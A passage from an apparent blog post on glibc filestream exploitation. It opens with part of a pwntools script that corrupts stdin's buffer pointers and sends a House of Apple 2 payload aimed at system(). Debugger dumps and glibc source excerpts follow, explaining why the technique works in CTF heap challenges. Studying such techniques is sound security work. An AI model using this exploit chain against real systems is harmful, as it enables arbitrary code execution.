+</span><span style="color:#6e7781">  14   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">sendafter</span><span style="color:#1f2328">(</span><span style="color:#0a3069">b'&gt;'</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0a3069">b'</span><span style="color:#cf222e">\0</span><span style="color:#0a3069">'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  15   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  16   </span><span style="color:#1f2328">target </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">'_IO_2_1_stdout_'</span><span style="color:#1f2328">]</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  17   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  18   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">send</span><span style="color:#1f2328">(</span><span style="color:#6639ba">p64</span><span style="color:#1f2328">(</span><span style="color:#0550ae">0</span><span style="color:#1f2328">)</span><span style="color:#1f2328"> </span><span style="color:#0550ae">*</span><span style="color:#1f2328"> </span><span style="color:#0550ae">3</span><span style="color:#1f2328"> </span><span style="color:#0550ae">+</span><span style="color:#1f2328"> </span><span style="color:#6639ba">p64</span><span style="color:#1f2328">(</span><span style="color:#1f2328">target</span><span style="color:#1f2328">)</span><span style="color:#1f2328"> </span><span style="color:#0550ae">+</span><span style="color:#1f2328"> </span><span style="color:#6639ba">p64</span><span style="color:#1f2328">(</span><span style="color:#1f2328">target </span><span style="color:#0550ae">+</span><span style="color:#1f2328"> </span><span style="color:#0550ae">0xe0</span><span style="color:#1f2328">))</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  19   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">f'3. overwriting _IO_buf_base_ (</span><span style="color:#0550ae">{</span><span style="color:#0550ae">hex</span><span style="color:#1f2328">(</span><span style="color:#1f2328">target</span><span style="color:#1f2328">)</span><span style="color:#0550ae">}</span><span style="color:#0a3069">) and _IO_buf_end_ (</span><span style="color:#0550ae">{</span><span style="color:#0550ae">hex</span><span style="color:#1f2328">(</span><span style="color:#1f2328">target</span><span style="color:#0a3069"> </span><span style="color:#0550ae">+</span><span style="color:#0a3069"> </span><span style="color:#0550ae">0xe0</span><span style="color:#1f2328">)</span><span style="color:#0550ae">}</span><span style="color:#0a3069">)'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  20   </span><span style="color:#0550ae">input</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'..'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  21   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  22   </span><span style="color:#cf222e">from</span><span style="color:#1f2328"> </span><span style="color:#cf222e">pwncli</span><span style="color:#1f2328"> </span><span style="color:#cf222e">import</span><span style="color:#1f2328"> io_file
+</span><span style="color:#6e7781">  23   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  24   </span><span style="color:#1f2328">file </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> io_file</span><span style="color:#0550ae">.</span><span style="color:#cf222e">IO_FILE_plus_struct</span><span style="color:#1f2328">()</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  25   </span><span style="color:#1f2328">payload </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> file</span><span style="color:#0550ae">.</span><span style="color:#6639ba">house_of_apple2_execmd_when_do_IO_operation</span><span style="color:#1f2328">(</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  26   │</span><span style="color:#1f2328">       libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">&quot;_IO_2_1_stdout_&quot;</span><span style="color:#1f2328">]</span><span style="color:#0550ae">,</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  27   │</span><span style="color:#1f2328">       libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">&quot;_IO_wfile_jumps&quot;</span><span style="color:#1f2328">]</span><span style="color:#0550ae">,</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  28   │</span><span style="color:#1f2328">       libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">&quot;system&quot;</span><span style="color:#1f2328">])</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  29   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  30   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'4. sending House of Apple 2 :)'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  31   </span><span style="color:#0550ae">input</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'..'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  32   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  33   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">send</span><span style="color:#1f2328">(</span><span style="color:#0550ae">bytes</span><span style="color:#1f2328">(</span><span style="color:#1f2328">payload</span><span style="color:#1f2328">))</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  34   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  35   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">interactive</span><span style="color:#1f2328">()</span><span style="color:#1f2328"></span></code></pre>
+   
+      <p>Note the fields set in <span class='monospace'>stdin</span> which dictate the location of our writes, that is the subtle difference between each debugger output above. In sum, the exploit technique is quite cute, we just chain two stdin writes and abuse stdin + stdout buffering to invoke writes where writes should not really be happening.</p>
+
+      <p>The tricky thing is that this requires constant calls to stdin / stdout functions. Of course, this is not so difficult a constraint most of the time, specifically in pwn challenges where a looping heap menu is provided (consuming both user input and providing user output repeatedly). There are not a lot of instances where you don't have access to this, though.</p>
+
+      <h2>The terrible details</h2>
+
+      <p>This is going to be a lot of <span class='monospace'>libc</span> internals that are not relevant to exploitation. As I was independently studying FSOP I found it really difficult to debug and wrap my head around, and only after a few months of on-and-off familiarization and practice with the technique do I feel a bit experienced, so I hope that this clear explanation of this wretched beast's inner workings are of some value.</p>
+
+      <p>The first question is why exactly is the buffer stored in the filestruct itself? The answer actually lies in the above output - it is subtle, but there is a <span class='monospace'>shortbuf</span> field contained within the filestruct that is used by libc when a filestream is specifically unbuffered.</p>
+
+      <pre><code>  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7efc76c03964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_save_base</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_IO_backup_base</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_IO_save_end</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_markers</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_chain</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_fileno</span> = 0x0,
+  <span style="color:#0550ae">_flags2</span> = 0x0,
+  <span style="color:#0550ae">_short_backupbuf</span> = &quot;&quot;,
+  <span style="color:#0550ae">_old_offset</span> = 0xffffffffffffffff,
+  <span style="color:#0550ae">_cur_column</span> = 0x0,
+  <span style="color:#0550ae">_vtable_offset</span> = 0x0,
+  <span style="color:#0550ae">_shortbuf</span> = &quot;&quot;,
+  <span style="color:#0550ae">_lock</span> = <span style="color:#cf222e">0x7efc76c05720</span> &lt;<span style="color:#953800">_IO_stdfile_0_lock</span>&gt;,
+  <span style="color:#0550ae">_offset</span> = 0xffffffffffffffff,
+  <span style="color:#0550ae">_codecvt</span> = <span style="color:#cf222e">0x0</span>,</code></pre>
+
+      <p>The <span class='monospace'>buf_base</span> and <span class='monospace'>buf_end</span> pointers actually point to this single-char sized buffer. This is configured in <span class='monospace'>_IO_doallocbuf</span>.</p>
+
+      <pre><code><span style="color:#6e7781">    25   </span><span style="color:#0550ae">void</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">    24   </span><span style="color:#1f2328">_IO_setb (</span><span style="color:#0550ae">FILE</span><span style="color:#1f2328"> *f, </span><span style="color:#0550ae">char</span><span style="color:#1f2328"> *b, </span><span style="color:#0550ae">char</span><span style="color:#1f2328"> *eb, </span><span style="color:#0550ae">int</span><span style="color:#1f2328"> a)
+</span><span style="color:#6e7781">    23   </span><span style="color:#1f2328">{
+</span><span style="color:#6e7781">    22   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">if</span><span style="color:#1f2328"> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))
+</span><span style="color:#6e7781">    21   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328"> free (f-&gt;_IO_buf_base);
+</span><span style="color:#6e7781">    20   │</span><span style="color:#1f2328"> f-&gt;_IO_buf_base = b;
+</span><span style="color:#6e7781">    19   │</span><span style="color:#1f2328"> f-&gt;_IO_buf_end = eb;
+</span><span style="color:#6e7781">    18   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">if</span><span style="color:#1f2328"> (a)
+</span><span style="color:#6e7781">    17   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328"> f-&gt;_flags &amp;= ~_IO_USER_BUF;
+</span><span style="color:#6e7781">    16   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">else</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">    15   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328"> f-&gt;_flags |= _IO_USER_BUF;
+</span><span style="color:#6e7781">    14   </span><span style="color:#1f2328">}
+</span><span style="color:#6e7781">    13   </span><span style="color:#1f2328">libc_hidden_def (_IO_setb)</span></code></pre>
+
+      <p>When the UNBUFFERED flag is set for a filestream, these fields point at <span class='monospace'>shortbuf</span>. Hence, <span class='monospace'>buf_base</span> and <span class='monospace'>buf_end</span> point to <span class='monospace'>shortbuf</span>. I think this is neat.</p>
+
+      <p>The second question is - well, not really a question. Let's just look at the underlying mechanisms by which the buffer is filled entirely. Note that the reads to fill the entire buffer are only invoked when we read from <span class='monospace'>stdin</span> once again (I hope this is intuitive). Indeed, on an intuitive sense we can understand that if we change the so-called 'backing buffer' of <span class='monospace'>stdin</span>, whatever bytes we now enter that buffer, duh. But why does the entire buffer get filled? Functions like <span class='monospace'>getchar()</span> are, by right, only supposed to read one byte. Let us look at more libc internals, yay.</p>
+
+      <p>The key is this <span class='monospace'>_IO_underflow</span> function, which is called by most* relevant funcs to our usecase.</p>
+
+      <pre><code><span style="color:#6e7781">    17   │</span><span style="color:#1f2328"> </span><span style="font-style:italic;color:#1f2328"></span><span style="font-style:italic;color:#6e7781">/* This is very tricky. We have to adjust those</span><span style="color:#1f2328"></span><span style="color:#1f2328">
+</span><span style="color:#6e7781">    16   │</span><span style="font-style:italic;color:#6e7781"></span><span style="font-style:italic;color:#6e7781"> </span><span style="color:#6e7781"></span><span style="color:#6e7781">│</span><span style="font-style:italic;color:#6e7781"></span><span style="font-style:italic;color:#6e7781">  pointers before we call _IO_SYSREAD () since</span><span style="color:#1f2328"></span><span style="color:#1f2328">
+</span><span style="color:#6e7781">    15   │</span><span style="font-style:italic;color:#6e7781"></span><span style="font-style:italic;color:#6e7781"> </span><span style="color:#6e7781"></span><span style="color:#6e7781">│</span><span style="font-style:italic;color:#6e7781"></span><span style="font-style:italic;color:#6e7781">  we may longjump () out while waiting for</span><span style="color:#1f2328"></span><span style="color:#1f2328">
+</span><span style="color:#6e7781">    14   │</span><span style="font-style:italic;color:#6e7781"></span><span style="font-style:italic;color:#6e7781"> </span><span style="color:#6e7781"></span><span style="color:#6e7781">│</span><span style="font-style:italic;color:#6e7781"></span><span style="font-style:italic;color:#6e7781">  input. Those pointers may be screwed up. H.J. */</span><span style="color:#1f2328"></span><span style="color:#1f2328">
+</span><span style="color:#6e7781">    13   │</span><span style="color:#1f2328"> fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
+</span><span style="color:#6e7781">    12   │</span><span style="color:#1f2328"> fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
+</span><span style="color:#6e7781">    11   │</span><span style="color:#1f2328"> fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
+</span><span style="color:#6e7781">    10   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328"> = fp-&gt;_IO_buf_base;
+</span><span style="color:#6e7781">     9   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">     8   │</span><span style="color:#1f2328"> count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
+</span><span style="color:#6e7781">     7   │ │ </span><span style="color:#1f2328">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span></code></pre>
+
+      <p><span class='monospace'>_IO_SYSREAD</span> is invoked on <span class='monospace'>buf_base</span> and <span class='monospace'>buf_end</span>, with the length being dynamically calculated from their difference. Forgive me if the following observations are obvious:</p>
+
+      <p>In regular functioning, let's say, stdin is allocated an 0x100 sized buffer. When we call <span class='monospace'>getc()</span> or <span class='monospace'>fgets(0x10)</span> or what-not more input is provided than immediately asked for, the lone read syscall consumes 0x100 bytes of that and stores it, such that the expensive read() syscalls are not always performed repeatedly. This is, obviously, the... entire fucking point of this whole input/output filestream nonsense, and our null-byte overwrite is merely an unintended consequence of very intended behaviour. It is like poetry, it rhymes, it echoes.</p>
+
+      <p>Ok, I have nothing else to add. I was going to write more, but I realized this specific aspect of libc filestream internals are actually quite intuitive and not all that arcane, so not a lot to explain. I hope this was interesting to you, and I hope this exploitation technique proves to be as useful for you as it has been for me many different times. I think it is very powerful!</p>
+
+      <a href='https://www.youtube.com/watch?v=sP9l9HBJ1o0'>Reward for reaching the end of this post</a>
+
+      <br><br>
+
+    </main>
+  </body>
+</html>
+
+
